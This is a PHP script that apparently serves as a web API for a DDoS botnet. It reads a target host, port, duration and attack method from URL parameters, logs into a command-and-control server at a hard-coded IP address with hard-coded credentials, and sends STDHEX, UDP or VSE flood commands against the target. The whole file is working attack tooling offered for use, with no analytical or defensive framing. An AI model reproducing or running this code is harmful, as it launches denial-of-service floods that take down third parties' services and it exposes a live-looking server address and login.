<?php
//API Link: http://ServerIP/API.php?&host=$host&port=$port&time=$time&type=$method
set_time_limit(0);

$server = "5.2.78.82";
$conport = 8899;
$username = "Snoopy";
$password = "123456";

$activekeys = array();

$method = $_GET['type'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

if($method == "STDHEX"){$command = "!* STDHEX $target $port $time";}
if($method == "UDP"){$command = "!* UDP $target $port $time 32 65500 10";}
if($method == "VSE"){$command = "!* VSE $target $port $time 32 1024 10";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if(!$sock){
        echo "Couldn't Connect To CNC Server...";
} else{
        print(fread($sock, 512)."\n");
        fwrite($sock, $username . "\n");
        echo "<br>";
        print(fread($sock, 512)."\n");
        fwrite($sock, $password . "\n");
        echo "<br>";
        if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
        }

        fwrite($sock, $command . "\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>